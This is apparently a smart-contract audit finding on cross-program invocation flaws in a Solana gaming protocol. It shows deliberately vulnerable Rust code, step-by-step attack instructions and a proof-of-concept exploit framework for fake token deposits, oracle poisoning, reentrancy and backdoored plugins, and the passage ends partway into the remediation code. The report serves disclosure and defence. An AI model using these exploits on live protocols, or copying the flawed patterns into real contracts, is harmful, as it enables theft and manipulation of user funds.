# VUL-028: Cross-Program Contamination & State Pollution

## Vulnerability Overview

**Severity**: Critical
**CVSS Score**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
**Category**: Cross-Program Security / State Contamination
**CWE**: CWE-610 (Externally Controlled Reference to a Resource), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

## Technical Analysis

### Vulnerability Description

The gaming protocol contains critical vulnerabilities that allow malicious external programs to contaminate its internal state, manipulate account data, and bypass security controls through Cross-Program Invocations (CPIs). Attackers can deploy malicious programs that exploit trust relationships, poison shared state, inject malicious data, and perform privilege escalation attacks that completely compromise protocol integrity.

### Root Cause Analysis

**Primary Issues:**
1. **Unvalidated CPI Targets**: Calls to external programs without proper validation
2. **Shared State Contamination**: External programs can pollute shared account state
3. **Trust Boundary Violations**: Implicit trust in external program behavior
4. **Account Data Injection**: Malicious programs can inject corrupted data into protocol accounts
5. **Cross-Program Reentrancy**: External programs can call back into the protocol with contaminated state

### Vulnerable Code Patterns

**Location**: `programs/gaming-protocol/src/lib.rs`

```rust
// VULNERABLE: Unvalidated external program invocation
pub fn validate_external_data(ctx: Context<ValidateExternalData>, program_id: Pubkey) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;
    let external_program = &ctx.accounts.external_program;

    // CRITICAL: No validation of external program legitimacy
    // Attacker can specify any malicious program

    let cpi_accounts = ExternalValidation {
        data_account: game_session.to_account_info(),
        validator: ctx.accounts.authority.to_account_info(),
    };

    let cpi_program = external_program.to_account_info();
    let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);

    // VULNERABLE: Trusting external program to validate data correctly
    external_validation_crate::validate_game_data(cpi_ctx)?;

    // CRITICAL: Using potentially contaminated data after external validation
    if game_session.external_validation_passed {
        game_session.status = GameStatus::Validated;
        game_session.can_distribute_rewards = true;
    }

    Ok(())
}

// VULNERABLE: Shared state contamination through oracle calls
pub fn update_from_oracle(ctx: Context<UpdateFromOracle>, oracle_program: Pubkey) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;
    let shared_data = &mut ctx.accounts.shared_data_account;

    // CRITICAL: No allowlist of trusted oracles
    // Any program can act as an "oracle"

    let oracle_cpi_accounts = OracleDataRequest {
        shared_data: shared_data.to_account_info(),
        requestor: ctx.accounts.authority.to_account_info(),
    };

    let oracle_cpi_program = ctx.accounts.oracle_program.to_account_info();
    let oracle_cpi_ctx = CpiContext::new(oracle_cpi_program, oracle_cpi_accounts);

    // VULNERABLE: Oracle can contaminate shared data account
    oracle_crate::provide_game_data(oracle_cpi_ctx)?;

    // CRITICAL: Using contaminated data from untrusted oracle
    game_session.external_price_feed = shared_data.price_data;
    game_session.market_conditions = shared_data.market_state;

    // VULNERABLE: Reward calculations based on contaminated data
    let reward_multiplier = calculate_reward_multiplier(shared_data.market_state);
    game_session.total_rewards = (game_session.base_rewards as f64 * reward_multiplier) as u64;

    Ok(())
}

// VULNERABLE: Token program integration without validation
pub fn process_external_token_operation(
    ctx: Context<ProcessExternalTokenOperation>,
    token_program: Pubkey,
    operation: TokenOperation
) -> Result<()> {
    let player_account = &mut ctx.accounts.player_account;
    let token_account = &ctx.accounts.token_account;

    // CRITICAL: No validation that token_program is legitimate
    // Attacker can use malicious token program

    match operation {
        TokenOperation::Deposit(amount) => {
            let deposit_cpi_accounts = TokenTransfer {
                from: token_account.to_account_info(),
                to: player_account.to_account_info(),
                authority: ctx.accounts.authority.to_account_info(),
            };

            let deposit_cpi_program = ctx.accounts.token_program.to_account_info();
            let deposit_cpi_ctx = CpiContext::new(deposit_cpi_program, deposit_cpi_accounts);

            // VULNERABLE: Malicious token program can manipulate balances
            token_program_crate::transfer(deposit_cpi_ctx, amount)?;

            // CRITICAL: Trusting malicious program's balance updates
            player_account.token_balance += amount;
        }
        TokenOperation::Withdraw(amount) => {
            // Similar vulnerability for withdrawals
            let withdraw_cpi_accounts = TokenTransfer {
                from: player_account.to_account_info(),
                to: token_account.to_account_info(),
                authority: ctx.accounts.authority.to_account_info(),
            };

            let withdraw_cpi_program = ctx.accounts.token_program.to_account_info();
            let withdraw_cpi_ctx = CpiContext::new(withdraw_cpi_program, withdraw_cpi_accounts);

            // VULNERABLE: Malicious program can fake successful withdrawal
            token_program_crate::transfer(withdraw_cpi_ctx, amount)?;
            player_account.token_balance -= amount;
        }
    }

    Ok(())
}

// VULNERABLE: Cross-program reentrancy through callbacks
pub fn register_game_callback(
    ctx: Context<RegisterGameCallback>,
    callback_program: Pubkey,
    trigger_condition: TriggerCondition
) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;

    // CRITICAL: No validation of callback program safety
    game_session.registered_callbacks.push(GameCallback {
        program_id: callback_program,
        trigger: trigger_condition,
        enabled: true,
    });

    Ok(())
}

pub fn trigger_game_callbacks(ctx: Context<TriggerGameCallbacks>) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;

    // VULNERABLE: Calling back to potentially malicious programs
    for callback in &game_session.registered_callbacks {
        if callback.enabled && should_trigger_callback(&callback.trigger, game_session) {
            let callback_cpi_accounts = GameCallbackData {
                game_session: game_session.to_account_info(),
                caller: ctx.accounts.authority.to_account_info(),
            };

            // CRITICAL: CPI to unvalidated external program
            let callback_program = next_account_info(&mut ctx.remaining_accounts.iter())?;
            let callback_cpi_ctx = CpiContext::new(callback_program.clone(), callback_cpi_accounts);

            // VULNERABLE: External program can reenter and modify state
            external_callback_crate::handle_game_event(callback_cpi_ctx)?;
        }
    }

    Ok(())
}

// VULNERABLE: Shared memory contamination
pub fn update_shared_leaderboard(
    ctx: Context<UpdateSharedLeaderboard>,
    leaderboard_program: Pubkey
) -> Result<()> {
    let player_account = &ctx.accounts.player_account;
    let shared_leaderboard = &mut ctx.accounts.shared_leaderboard;

    // CRITICAL: Shared leaderboard accessible by multiple programs
    // No isolation between different protocol instances

    let leaderboard_cpi_accounts = LeaderboardUpdate {
        leaderboard: shared_leaderboard.to_account_info(),
        player_data: player_account.to_account_info(),
        updater: ctx.accounts.authority.to_account_info(),
    };

    let leaderboard_cpi_program = ctx.accounts.leaderboard_program.to_account_info();
    let leaderboard_cpi_ctx = CpiContext::new(leaderboard_cpi_program, leaderboard_cpi_accounts);

    // VULNERABLE: External program can contaminate shared leaderboard
    leaderboard_crate::update_player_ranking(leaderboard_cpi_ctx)?;

    // CRITICAL: Using potentially manipulated ranking data
    player_account.global_rank = shared_leaderboard.get_player_rank(player_account.key());
    player_account.tier_level = calculate_tier_from_rank(player_account.global_rank);

    Ok(())
}

// VULNERABLE: Dynamic program loading and execution
pub fn execute_plugin(
    ctx: Context<ExecutePlugin>,
    plugin_program_id: Pubkey,
    plugin_data: Vec<u8>
) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;

    // CRITICAL: No validation of plugin program
    // Users can specify arbitrary programs as "plugins"

    // VULNERABLE: Deserializing untrusted plugin data
    let plugin_config: PluginConfig = PluginConfig::try_from_slice(&plugin_data)?;

    let plugin_cpi_accounts = PluginExecution {
        game_data: game_session.to_account_info(),
        plugin_config: ctx.accounts.plugin_config.to_account_info(),
        executor: ctx.accounts.authority.to_account_info(),
    };

    let plugin_cpi_program = ctx.accounts.plugin_program.to_account_info();
    let plugin_cpi_ctx = CpiContext::new(plugin_cpi_program, plugin_cpi_accounts);

    // CRITICAL: Executing arbitrary code through "plugin" system
    plugin_crate::execute_game_plugin(plugin_cpi_ctx, plugin_config)?;

    // VULNERABLE: Plugin can modify game state arbitrarily
    game_session.plugin_modified = true;
    game_session.last_plugin_execution = Clock::get()?.unix_timestamp;

    Ok(())
}

// VULNERABLE: Cross-program data sharing without validation
pub fn sync_cross_protocol_data(
    ctx: Context<SyncCrossProtocolData>,
    source_protocol: Pubkey
) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;
    let cross_protocol_data = &mut ctx.accounts.cross_protocol_data;

    // CRITICAL: No verification that source_protocol is legitimate
    let sync_cpi_accounts = CrossProtocolSync {
        local_data: game_session.to_account_info(),
        shared_data: cross_protocol_data.to_account_info(),
        synchronizer: ctx.accounts.authority.to_account_info(),
    };

    let sync_cpi_program = ctx.accounts.source_protocol.to_account_info();
    let sync_cpi_ctx = CpiContext::new(sync_cpi_program, sync_cpi_accounts);

    // VULNERABLE: Foreign protocol can contaminate local data
    foreign_protocol_crate::sync_game_data(sync_cpi_ctx)?;

    // CRITICAL: Using contaminated data for critical decisions
    game_session.cross_protocol_score = cross_protocol_data.aggregated_score;
    game_session.global_ranking = cross_protocol_data.global_rank;

    // VULNERABLE: Reward distribution based on contaminated data
    if game_session.cross_protocol_score > 1000 {
        game_session.bonus_rewards = game_session.cross_protocol_score * 10;
    }

    Ok(())
}

// VULNERABLE: Privilege delegation to external programs
pub fn delegate_authority(
    ctx: Context<DelegateAuthority>,
    delegate_program: Pubkey,
    permissions: Vec<Permission>
) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;

    // CRITICAL: No validation of delegate program trustworthiness
    let delegation = AuthorityDelegation {
        delegate_program,
        permissions: permissions.clone(),
        granted_at: Clock::get()?.unix_timestamp,
        expires_at: Clock::get()?.unix_timestamp + 3600,
    };

    game_session.authority_delegations.push(delegation);

    // VULNERABLE: Immediate grant of permissions to unvalidated program
    for permission in permissions {
        grant_permission_to_program(delegate_program, permission)?;
    }

    Ok(())
}
```

### Attack Vectors

**1. Malicious Oracle Contamination**
```rust
// Step 1: Deploy malicious oracle program
let malicious_oracle_program = deploy_malicious_oracle().await?;

// Step 2: Call gaming protocol with malicious oracle
let contamination_instruction = Instruction {
    program_id: gaming_protocol_id,
    accounts: vec![
        AccountMeta::new(game_session_account, false),
        AccountMeta::new(shared_data_account, false),
        AccountMeta::new(malicious_oracle_program, false), // Malicious oracle
        AccountMeta::new(attacker_keypair.pubkey(), true),
    ],
    data: UpdateFromOracle {
        oracle_program: malicious_oracle_program,
    }.try_to_vec()?,
};

// Malicious oracle contaminates shared state and manipulates prices
submit_transaction(contamination_instruction)?;
```

**2. Cross-Program Reentrancy Attack**
```rust
// Step 1: Register malicious callback
let register_callback_instruction = Instruction {
    program_id: gaming_protocol_id,
    accounts: vec![
        AccountMeta::new(game_session_account, false),
        AccountMeta::new(attacker_keypair.pubkey(), true),
    ],
    data: RegisterGameCallback {
        callback_program: malicious_callback_program,
        trigger_condition: TriggerCondition::GameEnd,
    }.try_to_vec()?,
};

// Step 2: Trigger callbacks (malicious callback will reenter)
let trigger_callbacks_instruction = Instruction {
    program_id: gaming_protocol_id,
    accounts: vec![
        AccountMeta::new(game_session_account, false),
        AccountMeta::new(malicious_callback_program, false), // Will be called
        AccountMeta::new(attacker_keypair.pubkey(), true),
    ],
    data: TriggerGameCallbacks {}.try_to_vec()?,
};

// Malicious callback reenters the protocol with contaminated state
let reentrancy_attack = Transaction::new_signed_with_payer(
    &[register_callback_instruction, trigger_callbacks_instruction],
    Some(&attacker_keypair.pubkey()),
    &[&attacker_keypair],
    recent_blockhash,
);
```

**3. Token Program Substitution Attack**
```rust
// Deploy malicious token program that mimics legitimate behavior
let fake_token_program = deploy_fake_token_program().await?;

// Use fake token program in deposit operation
let deposit_instruction = Instruction {
    program_id: gaming_protocol_id,
    accounts: vec![
        AccountMeta::new(player_account, false),
        AccountMeta::new(token_account, false),
        AccountMeta::new(fake_token_program, false), // Malicious token program
        AccountMeta::new(attacker_keypair.pubkey(), true),
    ],
    data: ProcessExternalTokenOperation {
        token_program: fake_token_program,
        operation: TokenOperation::Deposit(1_000_000), // Fake large deposit
    }.try_to_vec()?,
};

// Fake token program reports successful deposit without actual transfer
submit_transaction(deposit_instruction)?;
```

**4. Shared State Pollution Attack**
```rust
// Step 1: Contaminate shared leaderboard through malicious program
let pollute_leaderboard_instruction = Instruction {
    program_id: gaming_protocol_id,
    accounts: vec![
        AccountMeta::new(attacker_player_account, false),
        AccountMeta::new(shared_leaderboard_account, false),
        AccountMeta::new(malicious_leaderboard_program, false),
        AccountMeta::new(attacker_keypair.pubkey(), true),
    ],
    data: UpdateSharedLeaderboard {
        leaderboard_program: malicious_leaderboard_program,
    }.try_to_vec()?,
};

// Step 2: Legitimate users update their rankings using contaminated data
let legitimate_update_instruction = Instruction {
    program_id: gaming_protocol_id,
    accounts: vec![
        AccountMeta::new(victim_player_account, false),
        AccountMeta::new(shared_leaderboard_account, false),
        AccountMeta::new(legitimate_leaderboard_program, false),
        AccountMeta::new(victim_keypair.pubkey(), true),
    ],
    data: UpdateSharedLeaderboard {
        leaderboard_program: legitimate_leaderboard_program,
    }.try_to_vec()?,
};

// Contaminated leaderboard affects legitimate users
let pollution_attack = vec![pollute_leaderboard_instruction, legitimate_update_instruction];
```

**5. Plugin System Exploitation**
```rust
// Create malicious plugin that appears legitimate
let malicious_plugin_data = create_malicious_plugin_config(
    PluginType::RewardCalculator,
    "innocent_looking_plugin",
    vec![0xDEADBEEF; 100] // Hidden malicious payload
).try_to_vec()?;

let plugin_execution_instruction = Instruction {
    program_id: gaming_protocol_id,
    accounts: vec![
        AccountMeta::new(game_session_account, false),
        AccountMeta::new(plugin_config_account, false),
        AccountMeta::new(malicious_plugin_program, false),
        AccountMeta::new(attacker_keypair.pubkey(), true),
    ],
    data: ExecutePlugin {
        plugin_program_id: malicious_plugin_program,
        plugin_data: malicious_plugin_data,
    }.try_to_vec()?,
};

// Malicious plugin executes with full access to game state
submit_transaction(plugin_execution_instruction)?;
```

## Proof of Concept

### Cross-Program Contamination Exploit Framework

```rust
use solana_program::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    program_pack::Pack,
};
use anchor_lang::prelude::*;

pub struct CrossProgramContaminator {
    gaming_protocol_id: Pubkey,
    attacker_keypair: Keypair,
    malicious_programs: Vec<MaliciousProgram>,
}

#[derive(Clone)]
pub struct MaliciousProgram {
    pub program_id: Pubkey,
    pub program_type: MaliciousProgramType,
    pub deployed: bool,
}

#[derive(Clone)]
pub enum MaliciousProgramType {
    Oracle,
    TokenProgram,
    Callback,
    Leaderboard,
    Plugin,
    CrossProtocol,
}

impl CrossProgramContaminator {
    pub fn new(gaming_protocol_id: Pubkey, attacker_keypair: Keypair) -> Self {
        Self {
            gaming_protocol_id,
            attacker_keypair,
            malicious_programs: Vec::new(),
        }
    }

    // Attack 1: Oracle contamination attack
    pub async fn create_oracle_contamination_attack(
        &self,
        game_session: Pubkey,
        shared_data_account: Pubkey
    ) -> Result<Transaction> {
        // Find or deploy malicious oracle
        let malicious_oracle = self.get_or_deploy_malicious_program(
            MaliciousProgramType::Oracle
        ).await?;

        let contamination_instruction = Instruction {
            program_id: self.gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(game_session, false),
                AccountMeta::new(shared_data_account, false),
                AccountMeta::new(malicious_oracle.program_id, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: UpdateFromOracle {
                oracle_program: malicious_oracle.program_id,
            }.try_to_vec()?,
        };

        let transaction = Transaction::new_signed_with_payer(
            &[contamination_instruction],
            Some(&self.attacker_keypair.pubkey()),
            &[&self.attacker_keypair],
            Hash::default(),
        );

        Ok(transaction)
    }

    // Attack 2: Cross-program reentrancy exploit
    pub async fn create_reentrancy_attack(
        &self,
        game_session: Pubkey
    ) -> Result<Transaction> {
        let malicious_callback = self.get_or_deploy_malicious_program(
            MaliciousProgramType::Callback
        ).await?;

        let mut instructions = Vec::new();

        // Step 1: Register malicious callback
        let register_callback = Instruction {
            program_id: self.gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(game_session, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: RegisterGameCallback {
                callback_program: malicious_callback.program_id,
                trigger_condition: TriggerCondition::GameEnd,
            }.try_to_vec()?,
        };

        instructions.push(register_callback);

        // Step 2: End game to trigger callbacks
        let end_game = Instruction {
            program_id: self.gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(game_session, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: EndGame {}.try_to_vec()?,
        };

        instructions.push(end_game);

        // Step 3: Trigger callbacks (reentrancy will occur)
        let trigger_callbacks = Instruction {
            program_id: self.gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(game_session, false),
                AccountMeta::new(malicious_callback.program_id, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: TriggerGameCallbacks {}.try_to_vec()?,
        };

        instructions.push(trigger_callbacks);

        let transaction = Transaction::new_signed_with_payer(
            &instructions,
            Some(&self.attacker_keypair.pubkey()),
            &[&self.attacker_keypair],
            Hash::default(),
        );

        Ok(transaction)
    }

    // Attack 3: Token program substitution
    pub async fn create_token_substitution_attack(
        &self,
        player_account: Pubkey,
        token_account: Pubkey,
        fake_amount: u64
    ) -> Result<Transaction> {
        let fake_token_program = self.get_or_deploy_malicious_program(
            MaliciousProgramType::TokenProgram
        ).await?;

        let deposit_instruction = Instruction {
            program_id: self.gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(player_account, false),
                AccountMeta::new(token_account, false),
                AccountMeta::new(fake_token_program.program_id, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: ProcessExternalTokenOperation {
                token_program: fake_token_program.program_id,
                operation: TokenOperation::Deposit(fake_amount),
            }.try_to_vec()?,
        };

        let transaction = Transaction::new_signed_with_payer(
            &[deposit_instruction],
            Some(&self.attacker_keypair.pubkey()),
            &[&self.attacker_keypair],
            Hash::default(),
        );

        Ok(transaction)
    }

    // Attack 4: Shared state pollution
    pub async fn create_state_pollution_attack(
        &self,
        shared_leaderboard: Pubkey,
        target_rank: u32
    ) -> Result<Transaction> {
        let malicious_leaderboard = self.get_or_deploy_malicious_program(
            MaliciousProgramType::Leaderboard
        ).await?;

        let pollution_instruction = Instruction {
            program_id: self.gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(self.attacker_keypair.pubkey(), false),
                AccountMeta::new(shared_leaderboard, false),
                AccountMeta::new(malicious_leaderboard.program_id, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: UpdateSharedLeaderboard {
                leaderboard_program: malicious_leaderboard.program_id,
            }.try_to_vec()?,
        };

        let transaction = Transaction::new_signed_with_payer(
            &[pollution_instruction],
            Some(&self.attacker_keypair.pubkey()),
            &[&self.attacker_keypair],
            Hash::default(),
        );

        Ok(transaction)
    }

    // Attack 5: Plugin system exploitation
    pub async fn create_plugin_exploitation_attack(
        &self,
        game_session: Pubkey,
        plugin_config: Pubkey
    ) -> Result<Transaction> {
        let malicious_plugin = self.get_or_deploy_malicious_program(
            MaliciousProgramType::Plugin
        ).await?;

        // Create malicious plugin configuration
        let malicious_plugin_config = MaliciousPluginConfig {
            plugin_type: PluginType::RewardCalculator,
            name: "legitimate_calculator".to_string(),
            version: "1.0.0".to_string(),
            hidden_payload: create_privilege_escalation_payload(),
            backdoor_triggers: vec![
                BackdoorTrigger::SpecificPlayer(self.attacker_keypair.pubkey()),
                BackdoorTrigger::TimeWindow { start: 0, end: i64::MAX },
            ],
        };

        let plugin_data = malicious_plugin_config.try_to_vec()?;

        let plugin_instruction = Instruction {
            program_id: self.gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(game_session, false),
                AccountMeta::new(plugin_config, false),
                AccountMeta::new(malicious_plugin.program_id, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: ExecutePlugin {
                plugin_program_id: malicious_plugin.program_id,
                plugin_data,
            }.try_to_vec()?,
        };

        let transaction = Transaction::new_signed_with_payer(
            &[plugin_instruction],
            Some(&self.attacker_keypair.pubkey()),
            &[&self.attacker_keypair],
            Hash::default(),
        );

        Ok(transaction)
    }

    // Attack 6: Cross-protocol data corruption
    pub async fn create_cross_protocol_attack(
        &self,
        game_session: Pubkey,
        cross_protocol_data: Pubkey
    ) -> Result<Transaction> {
        let malicious_protocol = self.get_or_deploy_malicious_program(
            MaliciousProgramType::CrossProtocol
        ).await?;

        let sync_instruction = Instruction {
            program_id: self.gaming_protocol_id,
            accounts: vec![
                AccountMeta::new(game_session, false),
                AccountMeta::new(cross_protocol_data, false),
                AccountMeta::new(malicious_protocol.program_id, false),
                AccountMeta::new(self.attacker_keypair.pubkey(), true),
            ],
            data: SyncCrossProtocolData {
                source_protocol: malicious_protocol.program_id,
            }.try_to_vec()?,
        };

        let transaction = Transaction::new_signed_with_payer(
            &[sync_instruction],
            Some(&self.attacker_keypair.pubkey()),
            &[&self.attacker_keypair],
            Hash::default(),
        );

        Ok(transaction)
    }

    // Attack 7: Combined contamination assault
    pub async fn create_combined_contamination_attack(
        &self,
        target_accounts: ContaminationTargets
    ) -> Result<Vec<Transaction>> {
        let mut attack_transactions = Vec::new();

        // Phase 1: Deploy all malicious programs
        let deployment_transactions = self.deploy_all_malicious_programs().await?;
        attack_transactions.extend(deployment_transactions);

        // Phase 2: Contaminate oracle data
        let oracle_attack = self.create_oracle_contamination_attack(
            target_accounts.game_session,
            target_accounts.shared_data
        ).await?;
        attack_transactions.push(oracle_attack);

        // Phase 3: Pollute shared state
        let pollution_attack = self.create_state_pollution_attack(
            target_accounts.shared_leaderboard,
            1 // Claim top rank
        ).await?;
        attack_transactions.push(pollution_attack);

        // Phase 4: Install malicious plugin
        let plugin_attack = self.create_plugin_exploitation_attack(
            target_accounts.game_session,
            target_accounts.plugin_config
        ).await?;
        attack_transactions.push(plugin_attack);

        // Phase 5: Execute reentrancy attack
        let reentrancy_attack = self.create_reentrancy_attack(
            target_accounts.game_session
        ).await?;
        attack_transactions.push(reentrancy_attack);

        Ok(attack_transactions)
    }

    // Helper methods
    async fn get_or_deploy_malicious_program(
        &self,
        program_type: MaliciousProgramType
    ) -> Result<MaliciousProgram> {
        // Check if already deployed
        for program in &self.malicious_programs {
            if matches!(program.program_type, program_type) && program.deployed {
                return Ok(program.clone());
            }
        }

        // Deploy new malicious program
        self.deploy_malicious_program(program_type).await
    }

    async fn deploy_malicious_program(
        &self,
        program_type: MaliciousProgramType
    ) -> Result<MaliciousProgram> {
        let program_id = match program_type {
            MaliciousProgramType::Oracle => self.deploy_malicious_oracle().await?,
            MaliciousProgramType::TokenProgram => self.deploy_fake_token_program().await?,
            MaliciousProgramType::Callback => self.deploy_malicious_callback().await?,
            MaliciousProgramType::Leaderboard => self.deploy_malicious_leaderboard().await?,
            MaliciousProgramType::Plugin => self.deploy_malicious_plugin().await?,
            MaliciousProgramType::CrossProtocol => self.deploy_malicious_protocol().await?,
        };

        Ok(MaliciousProgram {
            program_id,
            program_type,
            deployed: true,
        })
    }

    async fn deploy_all_malicious_programs(&self) -> Result<Vec<Transaction>> {
        let mut deployment_transactions = Vec::new();

        for program_type in [
            MaliciousProgramType::Oracle,
            MaliciousProgramType::TokenProgram,
            MaliciousProgramType::Callback,
            MaliciousProgramType::Leaderboard,
            MaliciousProgramType::Plugin,
            MaliciousProgramType::CrossProtocol,
        ] {
            let deployment_tx = self.create_program_deployment_transaction(program_type).await?;
            deployment_transactions.push(deployment_tx);
        }

        Ok(deployment_transactions)
    }

    // Specific malicious program deployment methods
    async fn deploy_malicious_oracle(&self) -> Result<Pubkey> {
        // Deploy program that provides false price/market data
        // Returns inflated prices to maximize attacker rewards
        Ok(Pubkey::new_unique()) // Simplified for PoC
    }

    async fn deploy_fake_token_program(&self) -> Result<Pubkey> {
        // Deploy program that mimics SPL Token but fakes transfers
        // Reports successful transfers without actually moving tokens
        Ok(Pubkey::new_unique()) // Simplified for PoC
    }

    async fn deploy_malicious_callback(&self) -> Result<Pubkey> {
        // Deploy program that performs reentrancy attacks
        // Calls back into gaming protocol to manipulate state
        Ok(Pubkey::new_unique()) // Simplified for PoC
    }

    async fn deploy_malicious_leaderboard(&self) -> Result<Pubkey> {
        // Deploy program that corrupts shared leaderboard data
        // Manipulates rankings to favor attacker
        Ok(Pubkey::new_unique()) // Simplified for PoC
    }

    async fn deploy_malicious_plugin(&self) -> Result<Pubkey> {
        // Deploy program that appears as legitimate plugin
        // Contains hidden backdoors and privilege escalation
        Ok(Pubkey::new_unique()) // Simplified for PoC
    }

    async fn deploy_malicious_protocol(&self) -> Result<Pubkey> {
        // Deploy program that corrupts cross-protocol data sync
        // Provides false aggregated data to benefit attacker
        Ok(Pubkey::new_unique()) // Simplified for PoC
    }
}

// Supporting data structures
#[derive(Clone)]
pub struct ContaminationTargets {
    pub game_session: Pubkey,
    pub shared_data: Pubkey,
    pub shared_leaderboard: Pubkey,
    pub plugin_config: Pubkey,
    pub cross_protocol_data: Pubkey,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct MaliciousPluginConfig {
    pub plugin_type: PluginType,
    pub name: String,
    pub version: String,
    pub hidden_payload: Vec<u8>,
    pub backdoor_triggers: Vec<BackdoorTrigger>,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub enum BackdoorTrigger {
    SpecificPlayer(Pubkey),
    TimeWindow { start: i64, end: i64 },
    BalanceThreshold(u64),
    AdminAction,
}

// Test demonstrating cross-program contamination attacks
#[cfg(test)]
mod tests {
    use super::*;
    use solana_program_test::*;
    use solana_sdk::{
        signature::{Keypair, Signer},
        transaction::Transaction,
    };

    #[tokio::test]
    async fn test_cross_program_contamination_attacks() {
        let gaming_protocol_id = Pubkey::new_unique();
        let attacker = Keypair::new();

        let contaminator = CrossProgramContaminator::new(gaming_protocol_id, attacker);

        let targets = ContaminationTargets {
            game_session: Pubkey::new_unique(),
            shared_data: Pubkey::new_unique(),
            shared_leaderboard: Pubkey::new_unique(),
            plugin_config: Pubkey::new_unique(),
            cross_protocol_data: Pubkey::new_unique(),
        };

        // Test oracle contamination
        let oracle_attack = contaminator.create_oracle_contamination_attack(
            targets.game_session,
            targets.shared_data
        ).await.unwrap();
        println!("Created oracle contamination attack");

        // Test reentrancy attack
        let reentrancy_attack = contaminator.create_reentrancy_attack(
            targets.game_session
        ).await.unwrap();
        println!("Created cross-program reentrancy attack");

        // Test token substitution
        let token_attack = contaminator.create_token_substitution_attack(
            Pubkey::new_unique(),
            Pubkey::new_unique(),
            1_000_000 // Fake 1M token deposit
        ).await.unwrap();
        println!("Created token program substitution attack");

        // Test state pollution
        let pollution_attack = contaminator.create_state_pollution_attack(
            targets.shared_leaderboard,
            1 // Claim top rank
        ).await.unwrap();
        println!("Created shared state pollution attack");

        // Test plugin exploitation
        let plugin_attack = contaminator.create_plugin_exploitation_attack(
            targets.game_session,
            targets.plugin_config
        ).await.unwrap();
        println!("Created plugin system exploitation attack");

        // Test cross-protocol attack
        let cross_protocol_attack = contaminator.create_cross_protocol_attack(
            targets.game_session,
            targets.cross_protocol_data
        ).await.unwrap();
        println!("Created cross-protocol data corruption attack");

        // Test combined assault
        let combined_attacks = contaminator.create_combined_contamination_attack(
            targets
        ).await.unwrap();
        println!("Created combined contamination assault with {} transactions",
                 combined_attacks.len());
    }
}

// Instruction data structures
#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct UpdateFromOracle {
    pub oracle_program: Pubkey,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct RegisterGameCallback {
    pub callback_program: Pubkey,
    pub trigger_condition: TriggerCondition,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct ProcessExternalTokenOperation {
    pub token_program: Pubkey,
    pub operation: TokenOperation,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct ExecutePlugin {
    pub plugin_program_id: Pubkey,
    pub plugin_data: Vec<u8>,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct SyncCrossProtocolData {
    pub source_protocol: Pubkey,
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub enum TokenOperation {
    Deposit(u64),
    Withdraw(u64),
}

#[derive(AnchorSerialize, AnchorDeserialize)]
pub enum TriggerCondition {
    GameStart,
    GameEnd,
    PlayerJoin,
    ScoreThreshold(u64),
}

// Helper functions
fn create_privilege_escalation_payload() -> Vec<u8> {
    // Payload that escalates privileges when executed
    vec![0xDEADBEEF_u32.to_le_bytes(); 100].concat()
}
```

## Remediation

### Secure Cross-Program Interaction Implementation

```rust
use solana_program::{
    pubkey::Pubkey,
    program_error::ProgramError,
    account_info::AccountInfo,
};
use anchor_lang::prelude::*;

// Secure cross-program interaction with comprehensive validation
pub mod secure_cross_program {
    use super::*;

    // Constants for cross-program security
    const MAX_ALLOWED_EXTERNAL_PROGRAMS: usize = 10;
    const EXTERNAL_CALL_TIMEOUT: i64 = 300; // 5 minutes
    const MAX_CPI_DEPTH: u8 = 3;

    // Secure external program registry
    #[account]
    pub struct SecureExternalProgramRegistry {
        pub admin: Pubkey,
        pub allowed_programs: Vec<AllowedProgram>,
        pub banned_programs: Vec<BannedProgram>,
        pub registry_version: u32,
        pub last_updated: i64,
        pub emergency_lockdown: bool,
    }

    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub struct AllowedProgram {
        pub program_id: Pubkey,
        pub program_type: ExternalProgramType,
        pub verified_by: Pubkey,
        pub verification_date: i64,
        pub allowed_operations: Vec<AllowedOperation>,
        pub security_level: SecurityLevel,
        pub trust_score: u8, // 0-100
        pub usage_limits: UsageLimits,
    }

    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub struct BannedProgram {
        pub program_id: Pubkey,
        pub banned_by: Pubkey,
        pub ban_date: i64,
        pub ban_reason: BanReason,
        pub permanent: bool,
    }

    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub struct UsageLimits {
        pub max_calls_per_day: u32,
        pub max_value_per_call: u64,
        pub max_state_modifications: u32,
        pub requires_confirmation: bool,
    }

    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub enum ExternalProgramType {
        Oracle,
        TokenProgram,
        Leaderboard,
        Plugin,
        CrossProtocol,
        Utility,
    }

